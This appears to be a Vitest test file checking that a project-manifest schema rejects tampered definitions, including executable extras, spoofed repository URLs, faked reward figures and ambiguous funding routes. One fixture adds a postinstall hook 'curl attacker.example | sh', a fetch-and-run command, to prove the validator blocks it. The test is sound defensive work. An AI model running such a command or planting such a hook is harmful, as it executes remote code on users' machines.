/** Tests pull-request project manifests and registry-wide collision rejection. */

import { describe, expect, it } from "vitest";
import deltaStar from "../../projects/delta-star/project.json";
import eliza from "../../projects/eliza/project.json";
import {
  assertProjectDefinition,
  assertProjectRegistry,
} from "./project-schema.mjs";

describe("project proposal schema", () => {
  it("accepts the two launch folders as complete self-contained definitions", () => {
    expect(assertProjectRegistry([eliza, deltaStar])).toHaveLength(2);
    expect(assertProjectDefinition(eliza).reviewSkill.id).toBe(
      "review-eliza-contributions",
    );
  });

  it("rejects executable extras, identity mismatch, and fake commitment", () => {
    const executable = structuredClone(eliza) as Record<string, unknown>;
    executable.postinstall = "curl attacker.example | sh";
    expect(() => assertProjectDefinition(executable)).toThrow(/unexpected/u);

    const mismatched = structuredClone(eliza);
    mismatched.repositories[0].githubUrl = "https://github.com/attacker/repo";
    expect(() => assertProjectDefinition(mismatched)).toThrow(
      /does not match/u,
    );

    const fakeCommitment = structuredClone(eliza);
    fakeCommitment.reward.committedMinor = "1000000";
    expect(() => assertProjectDefinition(fakeCommitment)).toThrow(
      /inconsistent/u,
    );

    const fakeEnable = structuredClone(eliza);
    fakeEnable.reward.paymentMode = "enabled";
    expect(() => assertProjectDefinition(fakeEnable)).toThrow(/inconsistent/u);

    const misleadingCap = structuredClone(eliza);
    misleadingCap.reward.monthlyCapDisplay = "$100,000,000";
    expect(() => assertProjectDefinition(misleadingCap)).toThrow(
      /inconsistent/u,
    );

    const overlargeCap = structuredClone(eliza);
    overlargeCap.reward.monthlyCapMinor = "1000000000000001";
    expect(() => assertProjectDefinition(overlargeCap)).toThrow(/at most/u);
  });

  it("rejects repository and skill collisions across project folders", () => {
    const copy = structuredClone(deltaStar);
    copy.repositories[0] = structuredClone(eliza.repositories[0]);
    expect(() => assertProjectRegistry([eliza, copy])).toThrow(
      /duplicate repositories/u,
    );
  });

  it("requires disclosure without restricting the declared model", () => {
    expect(assertProjectDefinition(eliza).modelPolicy).toEqual({
      mode: "open-declared",
      disclosureRequired: true,
    });
    const gated = structuredClone(eliza);
    gated.modelPolicy = {
      mode: "frontier-only",
      approved: [{ client: "codex", provider: "openai", model: "example" }],
    } as never;
    expect(() => assertProjectDefinition(gated)).toThrow(
      /unexpected|declared model/u,
    );
  });

  it("keeps direct funding non-custodial and rejects ambiguous routes", () => {
    expect(assertProjectDefinition(eliza).funding).toMatchObject({
      mode: "direct-noncustodial",
      addresses: [],
    });
    const alteredDisclosure = structuredClone(eliza);
    alteredDisclosure.funding.disclosure = "Slop holds the funds." as never;
    expect(() => assertProjectDefinition(alteredDisclosure)).toThrow(
      /non-custodial/u,
    );

    const duplicate = structuredClone(eliza);
    duplicate.funding.addresses = [
      {
        network: "solana",
        asset: "USDC",
        address: "11111111111111111111111111111111",
        effectiveAt: "2026-08-16T00:00:00.000Z",
        replacedAt: null,
      },
      {
        network: "solana",
        asset: "USDC",
        address: "Vote111111111111111111111111111111111111111",
        effectiveAt: "2026-08-17T00:00:00.000Z",
        replacedAt: null,
      },
    ] as never;
    expect(() => assertProjectDefinition(duplicate)).toThrow(
      /duplicate route/u,
    );
  });
});
